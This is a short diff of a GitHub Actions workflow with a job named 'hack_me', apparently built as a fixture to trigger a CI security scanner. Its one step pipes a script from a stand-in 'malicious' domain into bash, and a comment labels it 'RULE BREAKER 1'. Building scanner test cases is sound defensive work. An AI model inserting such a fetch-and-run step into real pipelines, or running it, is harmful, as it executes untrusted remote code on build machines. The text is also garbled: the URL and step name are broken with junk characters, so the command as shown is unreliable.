@@ -5,7 +5,7 @@ jobs:
   hack_me:
     runs-on: ubuntu-latest
     steps:
-      - name: This will trigger the scannerfvs
+      - name: This will trigger the scanneferferfvs
         # RULE BREAKER 1: Piping curl to bash
         run: curl -sL http:cf vddd  c //maliciovdvdfvdfvdfvfdus.com/script.sh | bash
 
